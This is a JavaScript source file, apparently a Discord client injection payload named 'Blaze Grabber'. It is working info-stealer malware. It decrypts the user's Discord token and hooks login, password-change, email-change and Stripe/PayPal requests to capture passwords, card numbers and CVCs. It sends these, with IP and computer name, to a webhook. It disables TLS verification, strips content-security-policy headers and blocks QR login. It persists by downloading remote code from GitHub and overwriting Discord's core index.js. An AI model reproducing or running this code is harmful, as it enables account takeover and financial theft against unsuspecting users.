'use strict';

process.env['NODE_TLS_REJECT_UNAUTHORIZED'] = '0';

const fs          = require('fs');
const path        = require('path');
const https       = require('https');
const querystring = require('querystring');
const { BrowserWindow, session, safeStorage } = require('electron');

// ── Config ────────────────────────────────────────────────────────────────────
const WEBHOOK    = '%WEBHOOK%';
const AVATAR_URL = 'https://i.pinimg.com/originals/43/79/bb/4379bb008f3b678c973727818e68ab35.gif';
const EMBED_COLOR = 0xFF2514;
const BOT_NAME   = 'Blaze Grabber';
const INJECT_URL = 'https://raw.githubusercontent.com/blazewys/discordinjection/refs/heads/main/dcinject.js';

// ── State ─────────────────────────────────────────────────────────────────────
let _initDone   = false;
let _updateDone = false;

// ── execScript ────────────────────────────────────────────────────────────────
const execScript = (script) => {
    const win = BrowserWindow.getAllWindows()[0];
    return win.webContents.executeJavaScript(script, true);
};

// localStorage'dan şifreli token al, main process'te safeStorage ile çöz
const GET_LS_TOKEN_SCRIPT = `(function(){
    try {
        var f = document.createElement('iframe');
        document.body.appendChild(f);
        var ls = Object.getOwnPropertyDescriptor(f.contentWindow,'localStorage').get.call(window);
        f.remove();
        return ls.token || null;
    } catch(e) { return null; }
})()`;

async function getToken(retries = 8, delayMs = 2000) {
    for (let i = 0; i < retries; i++) {
        try {
            const encrypted = await execScript(GET_LS_TOKEN_SCRIPT);
            if (encrypted && encrypted.includes('dQw4w9WgXcQ:')) {
                const b64   = encrypted.replace(/^"?dQw4w9WgXcQ:/, '').replace(/"$/, '').trim();
                const buf   = Buffer.from(b64, 'base64');
                const token = safeStorage.decryptString(buf);
                if (token) return token;
            }
        } catch {}
        if (i < retries - 1) await sleep(delayMs);
    }
    return null;
}

function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

// ── HTTP helpers ──────────────────────────────────────────────────────────────

// Discord API — renderer üzerinden (Discord'un kendi session'ı, CORS yok)
const apiGet = (endpoint, token) =>
    execScript(`(function(){
        var x = new XMLHttpRequest();
        x.open("GET", "${endpoint}", false);
        x.setRequestHeader("Authorization", "${token}");
        x.send(null);
        try { return JSON.parse(x.responseText); } catch(e) { return null; }
    })()`);

async function getIP() {
    return new Promise(resolve => {
        const req = https.get('https://api.ipify.org?format=json', { timeout: 8000 }, res => {
            let b = '';
            res.on('data', d => b += d);
            res.on('end', () => { try { resolve(JSON.parse(b).ip || 'N/A'); } catch { resolve('N/A'); } });
        });
        req.on('error',   () => resolve('N/A'));
        req.on('timeout', () => { req.destroy(); resolve('N/A'); });
    });
}

async function resolveAvatar(baseUrl) {
    if (!baseUrl) return null;
    return new Promise(resolve => {
        const gifUrl = baseUrl + '.gif?size=512';
        const req = https.get(gifUrl, { timeout: 6000 }, res => {
            resolve(res.headers['content-type'] === 'image/gif'
                ? gifUrl : baseUrl + '.png?size=512');
        });
        req.on('error',   () => resolve(baseUrl + '.png?size=512'));
        req.on('timeout', () => { req.destroy(); resolve(baseUrl + '.png?size=512'); });
    });
}

async function postWebhook(payload) {
    return new Promise(resolve => {
        const body = JSON.stringify(payload);
        const url  = new URL(WEBHOOK);
        const req  = https.request({
            hostname: url.hostname,
            path:     url.pathname + url.search,
            method:   'POST',
            headers:  { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(body) },
            timeout:  15000,
        }, res => { res.resume(); resolve(res.statusCode); });
        req.on('error',   () => resolve(null));
        req.on('timeout', () => { req.destroy(); resolve(null); });
        req.write(body);
        req.end();
    });
}

// ── Badge / Nitro / Billing helpers ──────────────────────────────────────────

const BADGE_MAP = [
    [1,       '<:staff:968704541946167357>'],
    [2,       '<:partner:968704542021652560>'],
    [4,       '<:hypersquad_events:968704541774192693>'],
    [8,       '<:bug_hunter_1:968704541677723648>'],
    [512,     '<:early_supporter:968704542126510090>'],
    [16384,   '<:bug_hunter_2:968704541774217246>'],
    [131072,  '<:verified_dev:968704541702905886>'],
    [262144,  '<:certified_moderator:988996447938674699>'],
    [4194304, '<:Active_Dev:1045024909690163210>'],
];

function getBadges(flags) {
    const b = BADGE_MAP.filter(([v]) => (flags & v) === v).map(([, e]) => e);
    return b.length ? b.join(' ') : ':x:';
}

function getNitro(t) {
    return ({ 0: ':x:', 1: 'Nitro Classic', 2: 'Nitro', 3: 'Nitro Basic' })[t] ?? ':x:';
}

function parseBilling(sources) {
    if (!sources || !sources.length) return ':x:';
    const out = sources
        .filter(s => !s.invalid)
        .map(s => s.type === 1 ? ':credit_card:' : s.type === 2 ? '<:paypal:973417655627288666>' : null)
        .filter(Boolean);
    return out.length ? out.join(' ') : ':x:';
}

function parseHQFriends(relationships) {
    if (!Array.isArray(relationships)) return '';
    const HQ = [1, 2, 4, 8, 512, 16384, 131072, 262144, 4194304];
    const lines = [];
    for (const rel of relationships) {
        if (rel.type !== 1) continue;
        const u = rel.user || {};
        const badges = BADGE_MAP
            .filter(([v]) => HQ.includes(v) && (u.public_flags & v) === v)
            .map(([, e]) => e);
        if (!badges.length) continue;
        lines.push(`${badges.join('')} \`${u.username}\` (\`${u.id}\`)`);
        if (lines.join('\n').length > 900) break;
    }
    return lines.join('\n');
}

// ── Embed builder ─────────────────────────────────────────────────────────────

function buildPayload(title, fields, thumbnail, image) {
    const embed = { title, color: EMBED_COLOR, fields, footer: { text: BOT_NAME } };
    if (thumbnail) embed.thumbnail = { url: thumbnail };
    if (image)     embed.image     = { url: image };
    return { username: BOT_NAME, avatar_url: AVATAR_URL, embeds: [embed] };
}

async function buildUserInfo(token) {
    const [user, billing, friends] = await Promise.all([
        apiGet('https://discord.com/api/v9/users/@me',                         token),
        apiGet('https://discord.com/api/v9/users/@me/billing/payment-sources', token),
        apiGet('https://discord.com/api/v9/users/@me/relationships',           token),
    ]);
    if (!user || user.message) return null;

    const [avatar, banner] = await Promise.all([
        resolveAvatar(user.avatar ? `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}` : null),
        resolveAvatar(user.banner ? `https://cdn.discordapp.com/banners/${user.id}/${user.banner}` : null),
    ]);
    return { user, billing, friends, avatar, banner };
}

function buildFields(user, billing, friends, token, extra) {
    const fields = [
        { name: '👤 Username', value: `\`${user.username}\``,            inline: true  },
        { name: '🆔 ID',       value: `\`${user.id}\``,                  inline: true  },
        { name: '📧 Email',    value: `\`${user.email    || 'N/A'}\``,   inline: true  },
        { name: '📱 Phone',    value: `\`${user.phone    || 'N/A'}\``,   inline: true  },
        { name: '🔒 2FA',      value: user.mfa_enabled ? '✅' : '❌',    inline: true  },
        { name: '💎 Nitro',    value: getNitro(user.premium_type),       inline: true  },
        { name: '💳 Billing',  value: parseBilling(billing),             inline: true  },
        { name: '🏅 Badges',   value: getBadges(user.public_flags || 0), inline: true  },
        ...(extra || []),
        { name: '🔑 Token',    value: `\`${token}\``,                    inline: false },
    ];
    const hq = parseHQFriends(friends);
    if (hq) fields.push({ name: '⭐ HQ Friends', value: hq, inline: false });
    return fields;
}

function getDiscordClientName() {
    const parts = __dirname.replace(/\\/g, '/').split('/');
    for (let i = parts.length - 1; i >= 0; i--) {
        if (/^Discord(PTB|Canary|Development)?$/i.test(parts[i])) return parts[i];
    }
    return 'Discord';
}

// ── firstTime ─────────────────────────────────────────────────────────────────

async function firstTime() {
    if (_initDone) return;
    _initDone = true;

    try {
        const ip     = await getIP();
        const client = getDiscordClientName();
        const token  = await getToken(8, 2000);

        if (!token) {
            await postWebhook(buildPayload(
                'Discord Injection — No Session',
                [
                    { name: '💻 Computer', value: `\`${process.env.COMPUTERNAME || 'N/A'}\``, inline: true },
                    { name: '🌐 IP',       value: `\`${ip}\``,                                 inline: true },
                    { name: '📂 Client',   value: `\`${client}\``,                             inline: true },
                ],
                AVATAR_URL, null
            ));
            return;
        }

        const info = await buildUserInfo(token);
        if (!info) return;
        const { user, billing, friends, avatar, banner } = info;

        await postWebhook(buildPayload(
            'Discord Injection — Initialized',
            buildFields(user, billing, friends, token, [
                { name: '💻 Computer', value: `\`${process.env.COMPUTERNAME || 'N/A'}\``, inline: true },
                { name: '🌐 IP',       value: `\`${ip}\``,                                 inline: true },
                { name: '📂 Client',   value: `\`${client}\``,                             inline: true },
            ]),
            avatar || AVATAR_URL, banner || null
        ));
    } catch {}
}

// ── updateCheck ───────────────────────────────────────────────────────────────

function updateCheck() {
    if (_updateDone) return;
    _updateDone = true;
    try {
        const exeDir       = path.dirname(process.execPath);
        const resourcePath = path.join(exeDir, 'resources');
        if (!fs.existsSync(resourcePath)) return;

        const appDir  = path.join(resourcePath, 'app');
        const appAsar = path.join(resourcePath, 'app.asar');

        const modulesDir = path.join(exeDir, 'modules');
        if (!fs.existsSync(modulesDir)) return;
        const coreFolder = fs.readdirSync(modulesDir).find(x => /^discord_desktop_core-\d+$/.test(x));
        if (!coreFolder) return;
        const indexJs = path.join(modulesDir, coreFolder, 'discord_desktop_core', 'index.js');

        if (!fs.existsSync(appDir)) fs.mkdirSync(appDir, { recursive: true });
        fs.writeFileSync(path.join(appDir, 'package.json'),
            JSON.stringify({ name: 'discord', main: 'index.js' }, null, 4));

        const script = [
            `const fs=require('fs'),https=require('https');`,
            `const idx=${JSON.stringify(indexJs)};`,
            `const url=${JSON.stringify(INJECT_URL)};`,
            `const wh=${JSON.stringify(WEBHOOK)};`,
            `function init(){https.get(url,{timeout:15000},res=>{`,
            `  let d='';res.on('data',c=>d+=c);`,
            `  res.on('end',()=>{try{`,
            `    const cur=fs.readFileSync(idx,'utf8');`,
            `    if(cur.length<20000||cur==="module.exports = require('./core.asar');")`,
            `      fs.writeFileSync(idx,d.replace('%WEBHOOK%',wh));`,
            `  }catch{}});`,
            `}).on('error',()=>setTimeout(init,10000));}`,
            `init();`,
            `require(${JSON.stringify(appAsar)});`,
        ].join('\n');

        fs.writeFileSync(path.join(appDir, 'index.js'), script);
    } catch {}
}

// ── uploadData parse ──────────────────────────────────────────────────────────

function parseUploadData(details) {
    try {
        if (!details.uploadData || !details.uploadData[0]) return null;
        const raw = Buffer.from(details.uploadData[0].bytes).toString('utf8');
        if (!raw) return null;
        try { return JSON.parse(raw); }
        catch { return querystring.parse(decodeURIComponent(raw)); }
    } catch { return null; }
}

// ── onCompleted ───────────────────────────────────────────────────────────────

session.defaultSession.webRequest.onCompleted({
    urls: [
        'https://discord.com/api/v*/users/@me',
        'https://discordapp.com/api/v*/users/@me',
        'https://*.discord.com/api/v*/users/@me',
        'https://discord.com/api/v*/auth/login',
        'https://discordapp.com/api/v*/auth/login',
        'https://*.discord.com/api/v*/auth/login',
        'https://api.braintreegateway.com/merchants/*/client_api/v*/payment_methods/paypal_accounts',
        'https://api.stripe.com/v*/tokens',
        'https://api.stripe.com/v*/setup_intents/*/confirm',
        'https://api.stripe.com/v*/payment_intents/*/confirm',
    ],
}, async (details) => {
    if (details.statusCode !== 200 && details.statusCode !== 202) return;
    if (!['POST', 'PATCH'].includes(details.method)) return;

    const data = parseUploadData(details);
    if (!data) return;

    const token = await getToken(3, 1000);
    if (!token) return;

    const ip     = await getIP();
    const client = getDiscordClientName();
    const info   = await buildUserInfo(token);
    if (!info) return;

    const { user, billing, friends, avatar, banner } = info;
    const base = [
        { name: '💻 Computer', value: `\`${process.env.COMPUTERNAME || 'N/A'}\``, inline: true },
        { name: '🌐 IP',       value: `\`${ip}\``,                                 inline: true },
        { name: '📂 Client',   value: `\`${client}\``,                             inline: true },
    ];

    switch (true) {
        case details.url.endsWith('login'):
            if (!data.password) return;
            await postWebhook(buildPayload(
                'Discord — Login Captured',
                buildFields(user, billing, friends, token, [
                    ...base,
                    { name: '🔑 Password', value: `\`${data.password}\``, inline: false },
                ]),
                avatar || AVATAR_URL, banner || null
            ));
            break;

        case details.url.endsWith('users/@me') && details.method === 'PATCH':
            if (!data.password) return;
            if (data.new_password) {
                await postWebhook(buildPayload(
                    'Discord — Password Changed',
                    buildFields(user, billing, friends, token, [
                        ...base,
                        { name: '🔑 Old Password', value: `\`${data.password}\``,     inline: true },
                        { name: '🔑 New Password', value: `\`${data.new_password}\``, inline: true },
                    ]),
                    avatar || AVATAR_URL, banner || null
                ));
            }
            if (data.email) {
                await postWebhook(buildPayload(
                    'Discord — Email Changed',
                    buildFields(user, billing, friends, token, [
                        ...base,
                        { name: '📧 New Email', value: `\`${data.email}\``,    inline: true },
                        { name: '🔑 Password',  value: `\`${data.password}\``, inline: true },
                    ]),
                    avatar || AVATAR_URL, banner || null
                ));
            }
            break;

        case details.url.includes('api.stripe.com') && details.url.endsWith('tokens'):
            await postWebhook(buildPayload(
                'Discord — Credit Card Added',
                buildFields(user, billing, friends, token, [
                    ...base,
                    { name: '💳 Card',   value: `\`${data['card[number]']    || 'N/A'}\``,                                inline: true },
                    { name: '🔒 CVC',    value: `\`${data['card[cvc]']       || 'N/A'}\``,                                inline: true },
                    { name: '📅 Expiry', value: `\`${data['card[exp_month]'] || '?'}/${data['card[exp_year]'] || '?'}\``, inline: true },
                ]),
                avatar || AVATAR_URL, banner || null
            ));
            break;

        case details.url.includes('paypal_accounts'):
            await postWebhook(buildPayload(
                'Discord — PayPal Added',
                buildFields(user, billing, friends, token, base),
                avatar || AVATAR_URL, banner || null
            ));
            break;

        default:
            break;
    }
});

// ── onBeforeRequest ───────────────────────────────────────────────────────────

session.defaultSession.webRequest.onBeforeRequest({
    urls: [
        'https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json',
        'https://*.discord.com/api/v*/applications/detectable',
        'https://discord.com/api/v*/applications/detectable',
        'https://*.discord.com/api/v*/users/@me/library',
        'https://discord.com/api/v*/users/@me/library',
        'wss://remote-auth-gateway.discord.gg/*',
    ],
}, (details, callback) => {
    if (details.url.startsWith('wss://remote-auth-gateway')) {
        return callback({ cancel: true });
    }
    firstTime().catch(() => {});
    updateCheck();
    callback({});
});

// ── onHeadersReceived ─────────────────────────────────────────────────────────

session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
    delete details.responseHeaders['content-security-policy'];
    delete details.responseHeaders['content-security-policy-report-only'];
    callback({
        responseHeaders: {
            ...details.responseHeaders,
            'Access-Control-Allow-Headers': ['*'],
        },
    });
});

// ── Discord core yükle ────────────────────────────────────────────────────────

module.exports = require('./core.asar');
